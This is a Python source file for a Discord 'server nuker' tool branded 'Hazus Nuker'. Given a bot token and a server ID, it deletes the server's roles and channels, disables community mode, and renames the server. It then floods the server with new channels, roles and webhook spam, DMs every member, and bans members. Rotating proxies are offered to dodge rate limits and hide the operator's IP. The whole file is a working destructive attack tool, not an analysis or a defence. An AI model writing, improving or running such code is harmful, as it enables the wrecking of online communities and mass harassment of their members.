from discord import *
import aiohttp
import colorama
import asyncio
import configparser
import random
from modules import asynccprint, cprint
from modules import get_proxies

def bot_nuker():
    try:
        intents = Intents.default()
        intents.members = True
        intents.guilds = True

        use_proxy = input(colorama.Fore.WHITE + "Use proxies? (Super slow unless you have good proxies) (Y/N): ")
        dm_members = input(colorama.Fore.WHITE + "Dm members? (Y/N) ")
        ban_members = input(colorama.Fore.WHITE + "Ban members? (Y/N) ")
        if use_proxy.strip().lower() == "y":
            proxylist = get_proxies()
            if not proxylist:
                asynccprint("ERROR: NO PROXIES IN PROXIES.TXT", 1)
            use_primary_proxy = input(colorama.Fore.WHITE + "Use primary proxy? (If no, most operations will be done through your normal ip instead of proxies while a few operations are done through proxies in proxies.txt, if yes most operations will be done through the primary proxy while a few operations are done through proxies in proxies.txt) (Y/N): ")
            if use_primary_proxy.strip().lower() == 'y':
                proxy = input("Input primary proxy (This should be a single, decent quality proxy for best results): ")
                bot = Bot(intents=intents, proxy=f"http://{proxy}")
            else:
                bot = Bot(intents=intents)
        else:
            bot = Bot(intents=intents)

        config = configparser.ConfigParser()
        config.read('config.ini')
        token = config['bot_nuker_config']['bot_token']
        channel_name = config['bot_nuker_config']['channel_name']
        role_name = config['bot_nuker_config']['role_name']
        spam_message = config['bot_nuker_config']['spam_message']
        dm_message = config['bot_nuker_config']['dm_message']
        ban_message = config['bot_nuker_config']['ban_message']
        guild_name = config['bot_nuker_config']['server_name']

        guild_id = int(input("Discord Server ID: "))
        channel_spam_times = int(input("Number of channels to create: "))
        role_spam_times = int(input("Number of roles to create: "))
        message_spam_times = int(input("Number of messages to spam in each channel: "))

        complete = False

        async def delete_channel(channel):
            try:
                await channel.delete()
                await asynccprint(f"Deleted Channel {channel}", 0)
            except Exception as e:
                await asynccprint (e, 1)
        
        async def delete_role(role):
            try:
                if not role.managed:
                    await role.delete()
                    await asynccprint(f"Deleted Role {role}", 0)
                else:
                    return
            except Exception as e:
                await asynccprint (e, 1)

        def read_spam_message():
            try:
                with open('spam_message.txt', 'r', encoding='utf-8') as file:
                    return file.read().strip()
            except FileNotFoundError:
                asynccprint("spam_message.txt not found. Using default message.", 2)
                return spam_message

        async def spam_webhook(webhook, channel):
            message_content = read_spam_message()
            for _ in range(message_spam_times):
                try:
                    if use_proxy.strip().lower() == 'y':
                        proxy = random.choice(proxylist)
                        proxy = f'http://{proxy}'
                        async with aiohttp.ClientSession() as session:
                            async with session.post(webhook,
                                                    json={"content": message_content, "username": "Hazus Nuker"},
                                                    headers={"Content-Type": "application/json"}, timeout=4,
                                                    proxy=proxy) as response:
                                if 200 <= response.status <= 299:
                                    await asynccprint(f"Sent message in {channel}", 0)
                                else:
                                    await asynccprint(f"Webhook in channel {channel} is being rate limited.", 2)
                    else:
                        async with aiohttp.ClientSession() as session:
                            async with session.post(webhook,
                                                    json={"content": message_content, "username": "Hazus Nuker"},
                                                    headers={"Content-Type": "application/json"},
                                                    timeout=4) as response:
                                if 200 <= response.status <= 299:
                                    await asynccprint(f"Sent message in {channel}", 0)
                                else:
                                    await asynccprint(f"Webhook in channel {channel} is being rate limited.", 2)
                except Exception as e:
                    await asynccprint(f"Failed to send message in {channel}", 1)
                    await asyncio.sleep(0.5)

        async def create_webhook(channelid):
            retries = 0
            while True:
                try:
                    channel = await bot.fetch_channel(channelid)
                    webhook = await channel.create_webhook(name="Hazus Nuker")
                    await asynccprint(f"Created Webhook: {webhook.id}", 0)
                    await spam_webhook(webhook.url, channelid)
                    break
                except:
                    if retries > 3:
                        break
                    retries += 1
                    await asyncio.sleep(1)

        async def create_channel(guild):
            try:
                new_channel = await guild.create_text_channel(name=channel_name)
                await asynccprint(f"Created Channel: {new_channel.id}", 0)
                await create_webhook(new_channel.id)
            except:
                await asyncio.sleep(1)
                await create_channel(guild)

        async def create_role(guild):
            try:
                new_role = await guild.create_role(name=role_name)
                await asynccprint(f"Created Role: {new_role.id}", 0)
            except:
                await asyncio.sleep(1)
                await create_role(guild)

        async def ban_member(user_id):
            try:
                guild = bot.get_guild(guild_id)
                
                member = guild.get_member(user_id)
                if member is None:
                    member = await guild.fetch_member(user_id)
                
                if member.id == guild.owner_id:
                    return
                
                bot_member = guild.me
                if bot_member.top_role > member.top_role:
                    await member.ban(reason=ban_message)
                    await asynccprint(f"Banned Member: {user_id}", 0)

            except Exception as e:
                print (e)
                await asyncio.sleep(1)
                await ban_member(user_id)

        async def dm_member(user_id):
            try:
                if dm_members.strip().lower() == 'y':
                    user = await bot.fetch_user(user_id)
                    if user.bot:
                        return
                    await user.send(dm_message)
                    await asynccprint(f"DM'd Member: {user_id}", 0)
                if ban_members.strip().lower() == 'y':
                    await ban_member(user_id)
            except:
                await asyncio.sleep(1)
                await dm_member(user_id)

        async def delete_all_roles(guild, guild_roles):
            global complete
            while True:
                deletable_roles = [role for role in guild_roles if role < guild.me.top_role and role != guild.default_role and not role.managed]
                for role in deletable_roles:
                    await delete_role(role)
                if not deletable_roles:
                    complete = True
                    break
            

        @bot.event
        async def on_ready():
            guild = bot.get_guild(guild_id)

            bot.loop.create_task(delete_all_roles(guild, guild.roles))

            headers = {
                'Authorization': f'Bot {token}',
                'Content-Type': 'application/json',
            }

            data = {
                "description": None,
                "features": ["NEWS"],
                "preferred_locale": "en-US",
                "rules_channel_id": None,
                "public_updates_channel_id": None,
                "safety_alerts_channel_id": None,
            }

            async with aiohttp.ClientSession() as session:
                async with session.patch(f"https://discord.com/api/v9/guilds/{guild_id}", json=data, headers=headers) as response:
                    if response.ok:
                        await asynccprint("Disabled Community Mode", 0)
                    else:
                        response_text = await response.text()
                        await asynccprint(f"Failed to update guild settings. Status code: {response.status}, Response: {response_text}", 1)

            await guild.edit(name=guild_name)
            if response.ok:
                await asynccprint(f"Changed server name to \"{guild_name}\"", 0)
            else:
                response_text = await response.text()
                await asynccprint(f"Failed to change server name. Status code: {response.status}, Response: {response_text}", 1)

            while True:

                deletable_channels = [channel for channel in guild.channels if channel != guild.rules_channel and channel != guild.public_updates_channel and channel != guild.system_channel]

                if not deletable_channels:
                    await asynccprint("All deletable channels have been successfully deleted.", 0)
                    break

                delete_channels = [asyncio.create_task(delete_channel(channel)) for channel in deletable_channels]

                await asyncio.gather(*delete_channels)

            create_channels = [asyncio.create_task(create_channel(guild)) for _ in range(channel_spam_times)]
            create_roles = [asyncio.create_task(create_role(guild)) for _ in range(role_spam_times)]

            await asyncio.gather(*create_channels, *create_roles)

            members = [member.id for member in guild.members]
            for member in members:
                await dm_member(member)

            while True:
                if complete == True:
                    await asynccprint(f"Successfully Nuked {guild_id}", 0)
                    await bot.close()
                else:
                    await asyncio.sleep(5)

        bot.run(token)
    except Exception as e:
        cprint(f"{e}!", 1)
